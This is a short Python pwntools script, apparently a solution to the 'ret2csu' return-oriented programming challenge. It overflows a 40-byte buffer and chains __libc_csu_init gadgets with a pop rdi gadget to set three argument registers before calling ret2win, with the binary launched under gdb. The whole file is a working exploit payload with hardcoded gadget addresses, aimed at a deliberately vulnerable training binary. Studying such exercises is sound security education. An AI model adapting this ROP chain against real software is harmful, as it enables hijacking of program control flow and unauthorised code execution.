from pwn import *

exe = context.binary = ELF("ret2csu",checksec=False)
offset = 40


ret2win_gadget = 0x400510
pop_rdi_gadget = 0x4006a3
pop_rbx_rbp_r12_r13_r14_r15_gadget = 0x40069a
csu_mov_gadget = 0x400680

payload = flat(
    asm('nop') * offset,
    pop_rbx_rbp_r12_r13_r14_r15_gadget,
    0x3,
    0x4,
    0xdeadbeefdeadbeef,
    0xcafebabecafebabe,
    0xd00df00dd00df00d,
    csu_mov_gadget,
    pack(0) * 7,
    pop_rdi_gadget,
    0xdeadbeefdeadbeef,
    ret2win_gadget
)

# p = process()
p = gdb.debug("./ret2csu")
# p = process(["strace", "-o", "strace.out", "./ret2csu"])

p.sendlineafter(b">", payload)
p.recvuntil(b'Thank you!\n',timeout=2)

print(p.recv())
# p.interactive()